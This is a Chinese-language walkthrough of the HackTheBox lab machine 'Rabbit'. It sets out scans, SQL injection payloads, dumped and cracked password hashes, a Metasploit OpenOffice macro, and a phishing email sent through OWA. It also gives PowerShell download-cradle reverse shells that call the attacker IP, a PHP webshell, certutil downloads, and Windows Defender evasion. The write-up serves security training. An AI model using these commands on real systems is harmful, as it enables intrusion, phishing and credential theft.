> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_noY_sdb0F5GYvzQJz8HhA)

Rabbit是一个非常困难的靶机，知识点涉及垂直越权、SQL注入、邮件钓鱼、服务提权、Windows Defender绕过等。通过SQL注入可获取CMS中的账号密码，登陆OWA发送钓鱼邮件获取权限，绕过Windows Defender依靠Apache服务完成提权。感兴趣的同学可以在HackTheBox中进行学习。

![图片](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIg7DI2cHzoFLNiaLNSicfH3hRJx7FY7WkUVohibfU9ZfIGz8Dx5UtccYTwu8VZZ2ttDY64HyOJwynA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

0x01 侦查
-------

### 端口探测

首先通过nmap对目标进行端口扫描

```
nmap -Pn -p- -sV -sC -A 10.10.10.71 -oA nmap_Rabbit  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIg7DI2cHzoFLNiaLNSicfH3jfGjMXJNLI4aKVsoe4ibpD3unMFR8CVNREGxHydiclxV7Knp1mvuUiaHg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)扫描结果显示目标开放了80、88、135、443、445等端口，不愧是”狡兔三窟“，端口实在是多

#### 80端口

访问后显示403![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### 443端口

访问后发现这是 IIS 7 的默认界面![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)对站点进行目录扫描

```
gobuster dir -u https://10.10.10.71 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k  

```

但是需要添加 -k 参数，否则会出现无效证书的报错信息![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)正常情况访问到的目录都指向`https://10.10.10.71/owa`![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)访问该目录发现这是 outlook 邮件登陆界面

> Outlook是由微软公司所出品Office内的个人信息管理系统软件，功能包括收发电子邮件、查看日历等

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### 8080端口

访问后发现这是一个演示界面![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)对站点进行目录扫描

```
gobuster dir -u http://10.10.10.71:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)分别访问目录`/joomla`、`/complain`![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)在`/joomla`目录中未发现可利用点![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)`/comlain`目录则采用了 Complain Management System，默认账号密码为 admin/admin123

### 垂直越权漏洞

使用默认账号密码登录失败，尝试在注册页面`http://10.10.10.71:8080/complain/register.php`中注册账户，设置账号密码为 admin/admin123，用户类型为 Customer![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)注册完成后进入用户界面，点击`View Complain Details`发现其参数对应的是`mod=customer&view=compDetails`![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)将`mod`修改为admin，可以垂直越权看到投诉详情![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### SQL注入漏洞

Complain Management System 除了越权以外还存在SQL注入漏洞，漏洞地址为`http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans`，我们尝试进行手工注入 **参考文章1：https://www.exploit-db.com/exploits/42968** **参考文章2：https://www.exploit-db.com/exploits/41131**

首先看看数据库的基本信息，当前数据库版本为 5.7.19，当前用户为 Dbuser@localhost

```
id=engineer union all select 1,version(),3,user(),5,database(),7--  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)查看所有数据库名，其中包含`secret`、`Joomla`等

```
id=engineer union all select 1,schema_name,3,4,5,6,7 from information_schema.schemata--  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)查看`secret`数据库中的所有表，其中包含`users`表 **注：需要将库名修改为hex编码**

```
id=engineer union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=0x736563726574--  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)查看`users`表中所有列名

```
id=engineer union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name=0x7573657273--  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)获取`users`表中字段`username`和`password`当中的数据

```
id=engineer union all select 1,username,password,4,5,6,7 from secret.users--  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)获取到的账号密码如下：

```
 Kain       33903fbcc0b1046a09edfaa0a65e8f8c  
 Raziel     719da165a626b4cf23b626896c213b84  
 Ariel      B9c2538d92362e0e18e52d0ee9ca0c6f  
 Dimitri    D459f76a5eeeed0eca8ab4476c144ac4  
 Magnus     370fc3559c9f0bff80543f2e1151c537  
 Zephon     13fa8abd10eed98d89fd6fc678afaf94  
 Turel      D322dc36451587ea2994c84c9d9717a1  
 Dumah      33da7a40473c1637f1a2e142f4925194  
 Malek      Dea56e47f1c62c30b83b70eb281a6c39  
 Moebius    A6f30815a43f38ec6de95b9a9d74da37
```

当然我们也可以通过 sqlmap 来获取信息，但是需要在其中填入 Cookie 信息

```
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans' --cookie='PHPSESSID= ' -D secret -T users --dump  

```

通过破解网站对获取到的密文进行破解 **破解网站：https://crackstation.net/**![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)解密结果如下：

```
33903fbcc0b1046a09edfaa0a65e8f8c md5 doradaybendita  
719da165a626b4cf23b626896c213b84 md5 kelseylovesbarry  
B9c2538d92362e0e18e52d0ee9ca0c6f md5 pussycatdolls  
D459f76a5eeeed0eca8ab4476c144ac4 md5 shaunamaloney  
370fc3559c9f0bff80543f2e1151c537 md5 xNnWo6272k7x  
13fa8abd10eed98d89fd6fc678afaf94 Unknown Not found.  
D322dc36451587ea2994c84c9d9717a1 Unknown Not found.  
33da7a40473c1637f1a2e142f4925194 md5 popcorn  
Dea56e47f1c62c30b83b70eb281a6c39 md5 barcelona  
A6f30815a43f38ec6de95b9a9d74da37 md5 santiago  

```

0x02 上线[raziel]
---------------

### OWA邮件钓鱼

通过账号密码 Kain/doradaybendita 登录OWA并查看其中的邮件![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)在邮件中可以发现其中部署了 Open Office，但是计算机中 Windows Defender 已开启、PowerShell 已限制。

#### 制作木马

我们可使用 MSF 针对 Open Office 生成反弹shell文档`msf.odt`

```
msfconsole  
msf > use exploit/multi/misc/openoffice_document_macro  
msf > set srvhost 10.10.14.17  
msf > set lhost 10.10.14.17  
msf > run  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)将文档后缀名修改为`.zip`并将其解压

```
mv msf.odt msf.zip  

```

解压后找到`Basic/Standard/`目录并编辑文件`Module1.xml`修改`payload`

```
powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 1234 -e cmd  

```

但是由于 powershell 的限制，我们需要将其版本修改为 2

```
powershell.exe -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 1234 -e cmd;  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)将 powercat.ps1 复制到本目录下并开启 http 服务

```
cp /root/hackthebox/Machines/Jeeves/powercat.ps1 .  
python -m SimpleHTTPServer 80  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)在本地监听1234端口

```
nc -nvlp 1234  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### 邮件发送

选择邮件发送但是无法上传文件。后来发现我们需要在登录口选择轻量版进入才可以上传文件![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

将用户切换为 Ariel 后上传文件并向每个联系人发送邮件![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### 反弹shell

经过漫长的等待之后成功反弹shell![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)在当前用户桌面上寻找第一个flag

```
dir C:\Users\Raziel\Desktop  
type C:\Users\Raziel\Desktop\user.txt  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)成功拿到第一个flag，但是这个shell每隔一段时间就会断开

0x03 权限提升[system]
-----------------

### 信息收集

#### 系统信息

查看系统信息

```
systeminfo  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)结果显示目标系统安装多个补丁，经过检测后发现无法使用内核提权

#### 进程服务

查看进程未发现可用信息

```
tasklist /v  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)查看服务信息发现 apache 和 mysql 服务都为 system 权限

```
wmic service where started=true get name,startname  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)可借助 Apache 服务完成提权操作

### Windows Defender限制

查看当前用户对 wamp 根目录为何种权限

```
cacls C:\wamp64  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)结果显示具有写入权限，进入 web 目录并插入 webshell

```
echo '<?php echo system($_GET["cmd"]);?>' > cmd.php  
certutil -urlcache -split -f http://10.10.14.17/cmd.php c:\wamp64\www\cmd.php  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)但是木马 cmd.php 直接被 Windows Defender 杀掉了，尝试上传 nc.exe

```
certutil  -f -split -urlcache  http://10.10.14.17/nc.exe C:\Temp\nc.exe  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)没过一会 nc.exe 也被杀掉了，还是使用最初的 powershell v2 来绕过 Windows Defender

### Windows Defender绕过

创建 cmd.bat 文件用于设置反弹shell

```
powershell.exe -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 2345 -e cmd;  

```

创建 cmd.php 文件用于执行bat文件

```
<?php echo exec("C:\wamp64\www\cmd.bat");?>  

```

使用 certutil 上传 cmd.bat、cmd.php

```
certutil -urlcache -split -f http://10.10.14.17/cmd.php c:\wamp64\www\cmd.php  
certutil -urlcache -split -f http://10.10.14.17/cmd.bat c:\wamp64\www\cmd.bat  

```

在本地监听2345端口

```
nc -nvlp 2345  

```

访问 cmd.php 成功获得目标shell

```
curl http://10.10.10.71:8080/cmd.php  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)在管理员桌面上寻找第二个flag

```
dir c:\Users\Administrator\Desktop  
type c:\Users\Administrator\Desktop\root.txt  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)成功获取第二个flag